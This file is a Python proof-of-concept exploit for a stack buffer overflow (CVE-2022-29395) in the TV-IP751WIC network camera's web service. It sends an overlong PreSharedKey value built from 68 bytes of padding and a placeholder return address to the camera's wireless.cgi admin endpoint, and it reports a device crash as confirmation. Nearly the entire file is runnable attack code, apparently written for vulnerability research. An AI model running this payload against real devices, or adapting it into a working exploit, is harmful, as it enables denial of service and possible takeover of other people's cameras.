#!/usr/bin/env python3
"""PoC: TV-IP751WIC alphapd Wifi Key Stack Overflow | CWE-121 | CVSS 9.8"""
import requests, struct, sys

TARGET = sys.argv[1] if len(sys.argv)>1 else "192.168.1.100"
PAYLOAD = b"A" * 68 + struct.pack(">I", 0x41414141)

print(f"TV-IP751WIC Wifi Key Stack Overflow PoC")
print(f"Target: {TARGET}")
print(f"FirmRec: 17 simexp hits @ 0x41414141 (CVE-2022-29395)")
print()

# PreSharedKey overflow
try:
    r = requests.post(f"http://{TARGET}/cgi-bin/admin/wireless.cgi", data={
        "AuthenticationType": "WPA2PSK",
        "PreSharedKey": PAYLOAD.decode("latin-1"),
        "SSID": "TestCamera",
        "WEPKeyFormat": "ASCII",
    }, timeout=5)
    print(f"PreSharedKey: {r.status_code}")
except:
    print("PreSharedKey: Device crashed — overflow confirmed")
